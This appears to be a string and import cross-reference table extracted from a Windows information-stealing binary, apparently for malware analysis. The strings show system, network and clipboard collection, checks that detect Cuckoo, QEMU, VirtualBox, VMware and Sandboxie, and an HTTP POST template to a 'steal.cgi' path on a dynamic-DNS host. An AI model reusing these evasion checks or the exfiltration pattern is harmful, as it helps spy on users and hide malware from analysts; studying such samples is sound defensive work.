reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x401509	0x41644c	import	0x401500	KERNEL32.dll.GetModuleHandleA
0x40150f	0x40e000	string	0x401500	libgcc_s_dw2-1.dll
0x401525	0x40e000	string	0x401500	libgcc_s_dw2-1.dll
0x40152c	0x416494	import	0x401500	KERNEL32.dll.LoadLibraryA
0x401532	0x416450	import	0x401500	KERNEL32.dll.GetProcAddress
0x401540	0x40e013	string	0x401500	__register_frame_info
0x401558	0x40e029	string	0x401500	__deregister_frame_info
0x40158b	0x40e041	string	0x401500	libgcj-16.dll
0x4015a0	0x40e04f	string	0x401500	_Jv_RegisterClasses
0x4015ab	0x416450	import	0x401500	KERNEL32.dll.GetProcAddress
0x401624	0x416420	import	0x401600	KERNEL32.dll.FreeLibrary
0x40169b	0x40e064	string	0x40168c	170012
0x4016a3	0x40e06b	string	0x40168c	/path/steal.cgi
0x4016ab	0x40e07b	string	0x40168c	thunder-winbecome.ddns.net
0x4016b3	0x40e07b	string	0x40168c	thunder-winbecome.ddns.net
0x4016bb	0x40e06b	string	0x40168c	/path/steal.cgi
0x4016c3	0x40e098	string	0x40168c	POST %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows XP)\r\nReferer: http://%s%s\r\nCokkie: xtl_s=%s\r\nContent-Length: 207\r\n\r\n
0x401980	0x40e132	string	0x401963	XXX\nANNIE-DAEMON\n
0x4019c1	0x40e146	string	0x40198f	.\Sagittarius.txt
0x401a6d	0x40e160	string	0x40198f	<System up time>\nContinuous operation time: %lu msec.\n\n
0x401a97	0x40e198	string	0x40198f	<Sample path & meta data>
0x401b99	0x40e1b3	string	0x40198f	<Start up list>\n
0x401c73	0x40e1c4	string	0x40198f	<Desktop customization>\n
0x401d2f	0x40e1dd	string	0x40198f	<File access history>\n
0x401dfb	0x40e1f4	string	0x40198f	<Path of wallpaper>\n
0x401e3c	0x40e209	string	0x40198f	<Adobe history>\n
0x401f06	0x40e146	string	0x40198f	.\Sagittarius.txt
0x401f7e	0x40e21a	string	0x401f48	DeviceId
0x401fb6	0x40e22c	string	0x401f48	PCI\VEN_80EE&DEV_CAFE
0x40203e	0x40e258	string	0x401fd0	.\Scorpius.txt
0x4020eb	0x40e27c	string	0x401fd0	name
0x4020f5	0x40e288	string	0x401fd0	NumberOfFunctionKeys
0x4020ff	0x40e2b2	string	0x401fd0	Layout
0x402113	0x40e27c	string	0x401fd0	name
0x40211d	0x40e2c0	string	0x401fd0	Manufacturer
0x402127	0x40e2da	string	0x401fd0	HardwareType
0x40213b	0x40e2f4	string	0x401fd0	CurrentVerticalResolution
0x402145	0x40e328	string	0x401fd0	CurrentHorizontalResolution
0x402159	0x40e360	string	0x401fd0	MonitorType
0x402163	0x40e378	string	0x401fd0	ScreenHeight
0x40216d	0x40e392	string	0x401fd0	ScreenWidth
0x402177	0x40e3ac	string	0x401fd0	MonitorManufacturer
0x40218b	0x40e3d4	string	0x401fd0	Name
0x402195	0x40e2c0	string	0x401fd0	Manufacturer
0x40219f	0x40e3de	string	0x401fd0	Product
0x4021a9	0x40e3ee	string	0x401fd0	Version
0x4021b3	0x40e3fe	string	0x401fd0	SerialNumber
0x4021bd	0x40e2c0	string	0x401fd0	Manufacturer
0x4021c7	0x40e418	string	0x401fd0	ReleaseDate
0x4021d1	0x40e430	string	0x401fd0	SMBIOSBIOSVersion
0x4021db	0x40e454	string	0x401fd0	InstallDate
0x4021e5	0x40e3fe	string	0x401fd0	SerialNumber
0x4021ef	0x40e46c	string	0x401fd0	RegisteredUser
0x4021f9	0x40e48a	string	0x401fd0	Locale
0x402203	0x40e498	string	0x401fd0	TimeGenerated
0x402224	0x40e4b4	string	0x401fd0	<keyboard>\n
0x402249	0x40e4c0	string	0x401fd0	SELECT * FROM Win32_keyboard
0x402259	0x40e502	string	0x401fd0	ROOT\CIMV2
0x40228f	0x40e518	string	0x401fd0	<mouse>\n
0x4022b4	0x40e524	string	0x401fd0	SELECT * FROM Win32_PointingDevice
0x4022c4	0x40e502	string	0x401fd0	ROOT\CIMV2
0x4022fa	0x40e56a	string	0x401fd0	<video card>\n
0x40231f	0x40e578	string	0x401fd0	SELECT * FROM Win32_VideoController
0x40232f	0x40e502	string	0x401fd0	ROOT\CIMV2
0x402365	0x40e5c0	string	0x401fd0	<desktop monitor>\n
0x40238a	0x40e5d4	string	0x401fd0	SELECT * FROM Win32_DesktopMonitor
0x40239a	0x40e502	string	0x401fd0	ROOT\CIMV2
0x4023d0	0x40e61a	string	0x401fd0	<usb>\n
0x4023f5	0x40e624	string	0x401fd0	SELECT * FROM Win32_PnPEntity WHERE DeviceID like '%USB%'
0x402405	0x40e502	string	0x401fd0	ROOT\CIMV2
0x40243b	0x40e69a	string	0x401fd0	<mother board>\n
0x402460	0x40e6ac	string	0x401fd0	SELECT * FROM Win32_BaseBoard
0x402470	0x40e502	string	0x401fd0	ROOT\CIMV2
0x4024a6	0x40e6e8	string	0x401fd0	<bios>\n
0x4024cb	0x40e6f0	string	0x401fd0	SELECT * FROM Win32_BIOS
0x4024db	0x40e502	string	0x401fd0	ROOT\CIMV2
0x402511	0x40e722	string	0x401fd0	<os>\n
0x402536	0x40e728	string	0x401fd0	SELECT * FROM Win32_OperatingSystem
0x402546	0x40e502	string	0x401fd0	ROOT\CIMV2
0x40257c	0x40e770	string	0x401fd0	<login history>\n
0x4025a1	0x40e784	string	0x401fd0	SELECT * FROM Win32_NTLogEvent WHERE logfile='system' And EventCode='6005'
0x4025b1	0x40e502	string	0x401fd0	ROOT\CIMV2
0x4025e7	0x40e81a	string	0x401fd0	<emulator detection>\n
0x40260a	0x40e830	string	0x401fd0	[*] Detect by checking for VBox devices ...
0x40262a	0x40e860	string	0x401fd0	root\cimv2
0x402652	0x40e876	string	0x401fd0	FALSE\n
0x402671	0x40e880	string	0x401fd0	SELECT DeviceId FROM Win32_PnPEntity
0x4026b7	0x40e8ca	string	0x401fd0	TRUE\n
0x4026dc	0x40e876	string	0x401fd0	FALSE\n
0x4026ff	0x40e8d0	string	0x401fd0	[*] Detect by looking for VMware serial number ...
0x40271f	0x40e860	string	0x401fd0	root\cimv2
0x402747	0x40e876	string	0x401fd0	FALSE\n
0x402763	0x40e908	string	0x401fd0	SELECT SerialNumber FROM Win32_Bios
0x4027a9	0x40e8ca	string	0x401fd0	TRUE\n
0x4027ce	0x40e876	string	0x401fd0	FALSE\n
0x40288d	0x40e258	string	0x401fd0	.\Scorpius.txt
0x402902	0x40e3fe	string	0x4028cc	SerialNumber
0x40293a	0x40e950	string	0x4028cc	VMware
0x40297f	0x40e95e	string	0x402954	.\Circinus.txt
0x402a39	0x40e970	string	0x402954	<IP, MAC, Default Gateway, DNS>\n
0x402a67	0x40e991	string	0x402954	\n<Port List>\n
0x402aa0	0x40e99f	string	0x402954	\n<ARP List>\n
0x402b6a	0x40e95e	string	0x402954	.\Circinus.txt
0x402bd4	0x40e9ac	string	0x402ba9	.\Aquarius.txt
0x402c8e	0x40e9be	string	0x402ba9	<Application list>\n
0x402caa	0x40e9d2	string	0x402ba9	.exe
0x402cc9	0x40e9d7	string	0x402ba9	C:\Program Files
0x402d88	0x40e9ac	string	0x402ba9	.\Aquarius.txt
0x402df2	0x40e9e8	string	0x402dc7	.\Orion.txt
0x402eac	0x40e9f7	string	0x402dc7	\n<OS product ID>\n
0x402eed	0x40ea09	string	0x402dc7	<System manufacturer>\n
0x402f2e	0x40ea20	string	0x402dc7	<OS Version>\n
0x402f6f	0x40ea2e	string	0x402dc7	<# Processors>\n
0x402fb5	0x40ea3e	string	0x402dc7	<Memory>\n
0x403001	0x40ea48	string	0x402dc7	<Disk>\n
0x40304d	0x40ea50	string	0x402dc7	<# Icons of Desktop>\n
0x403093	0x40ea66	string	0x402dc7	<System locale>\n
0x4030d9	0x40ea77	string	0x402dc7	<Time zone>\n
0x403122	0x40ea84	string	0x402dc7	<Resolution>\n
0x40316b	0x40ea92	string	0x402dc7	<Process list>\n
0x4031ac	0x40eaa2	string	0x402dc7	<Clip board>\n
0x403276	0x40e9e8	string	0x402dc7	.\Orion.txt
0x40330b	0x40eab0	string	0x4032d3	.\Pisces.txt
0x4033c5	0x40eac0	string	0x4032d3	Sandbox detected 'TRUE', undetected 'FALSE'\n\n
0x4033e8	0x40eaee	string	0x4032d3	[-] Cuckoo detection\n
0x40340b	0x40eb04	string	0x4032d3	[*] Detect by cuckoo return address is stored in the TLS (hooks information structure) ...
0x403440	0x40e8ca	string	0x4032d3	TRUE\n
0x403465	0x40e876	string	0x4032d3	FALSE\n
0x403488	0x40eb64	string	0x4032d3	Cuckoo stores the return address in an extra space, allocated in the hook information structure FS: TLS_HOOK_INFO (Thread Local Storage)\n
0x4034ab	0x40ebf4	string	0x4032d3	Therefor read the address of hook information and calculate the min and max value for the return address value location. Also FireEye use cuckoo https://github.com/David-Reguera-Garcia-Dreg/anticuckoo\n
0x4034ce	0x40ecc3	string	0x4032d3	[-] Qemu detection\n
0x4034f1	0x40ecd8	string	0x4032d3	[*] Reg key Scsi identifier is QEMU ...
0x4034fd	0x40ed03	string	0x4032d3	QEMU
0x403505	0x40ed08	string	0x4032d3	Identifier
0x40350d	0x40ed14	string	0x4032d3	HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
0x40353c	0x40e8ca	string	0x4032d3	TRUE\n
0x403561	0x40e876	string	0x4032d3	FALSE\n
0x403584	0x40ed64	string	0x4032d3	[*] Reg key (HKLM\HARDWARE\Description\System "SystemBiosVersion") is QEMU ...
0x403590	0x40ed03	string	0x4032d3	QEMU
0x403598	0x40edb6	string	0x4032d3	SystemBiosVersion
0x4035a0	0x40edc8	string	0x4032d3	HARDWARE\Description\System
0x4035cf	0x40e8ca	string	0x4032d3	TRUE\n
0x4035f4	0x40e876	string	0x4032d3	FALSE\n
0x403617	0x40ede4	string	0x4032d3	[-] Sandboxie detection\n
0x40363a	0x40ee00	string	0x4032d3	[*] Using GetModuleHandle() to search sbiedll.dll ...
0x403646	0x40ee39	string	0x4032d3	sbiedll.dll
0x403672	0x40e8ca	string	0x4032d3	TRUE\n
0x403697	0x40e876	string	0x4032d3	FALSE\n
0x4036ba	0x40ee45	string	0x4032d3	[-] VBox detection\n
0x4036dd	0x40ee5c	string	0x4032d3	[*] Reg key Scsi identifier is VBOX ...
0x4036e9	0x40ee87	string	0x4032d3	VBOX
0x4036f1	0x40ed08	string	0x4032d3	Identifier
0x4036f9	0x40ed14	string	0x4032d3	HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
0x403728	0x40e8ca	string	0x4032d3	TRUE\n
0x40374d	0x40e876	string	0x4032d3	FALSE\n
0x403770	0x40ee8c	string	0x4032d3	[*] Reg key (HKLM\HARDWARE\Description\System "SystemBiosVersion") is VBOX...
0x40377c	0x40ee87	string	0x4032d3	VBOX
0x403784	0x40edb6	string	0x4032d3	SystemBiosVersion
0x40378c	0x40edc8	string	0x4032d3	HARDWARE\Description\System
0x4037bb	0x40e8ca	string	0x4032d3	TRUE\n
0x4037e0	0x40e876	string	0x4032d3	FALSE\n
0x403803	0x40eee0	string	0x4032d3	[*] Reg key (HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions) ...
0x40380f	0x40ef28	string	0x4032d3	SOFTWARE\Oracle\VirtualBox Guest Additions
0x40383e	0x40e8ca	string	0x4032d3	TRUE\n
0x403863	0x40e876	string	0x4032d3	FALSE\n
0x403886	0x40ef54	string	0x4032d3	[*] Reg key (HKLM\HARDWARE\Description\System "VideoBiosVersion") is VIRTUALBOX...
0x403892	0x40efaa	string	0x4032d3	VIRTUALBOX
0x40389a	0x40efb5	string	0x4032d3	VideoBiosVersion
0x4038a2	0x40edc8	string	0x4032d3	HARDWARE\Description\System
0x4038d1	0x40e8ca	string	0x4032d3	TRUE\n
0x4038f6	0x40e876	string	0x4032d3	FALSE\n
0x403919	0x40efc8	string	0x4032d3	[*] Reg key (HKLM\HARDWARE\ACPI\DSDT\VBOX__) ...
0x403925	0x40effc	string	0x4032d3	HARDWARE\ACPI\DSDT\VBOX__
0x403954	0x40e8ca	string	0x4032d3	TRUE\n
0x403979	0x40e876	string	0x4032d3	FALSE\n
0x40399c	0x40f018	string	0x4032d3	[*] Reg key (HKLM\HARDWARE\ACPI\FADT\VBOX__) ...
0x4039a8	0x40f04c	string	0x4032d3	HARDWARE\ACPI\FADT\VBOX__
0x4039d7	0x40e8ca	string	0x4032d3	TRUE\n
0x4039fc	0x40e876	string	0x4032d3	FALSE\n
0x403a1f	0x40f068	string	0x4032d3	[*] Reg key (HKLM\HARDWARE\ACPI\RSDT\VBOX__) ...
0x403a2b	0x40f09c	string	0x4032d3	HARDWARE\ACPI\RSDT\VBOX__
0x403a5a	0x40e8ca	string	0x4032d3	TRUE\n
0x403a7f	0x40e876	string	0x4032d3	FALSE\n
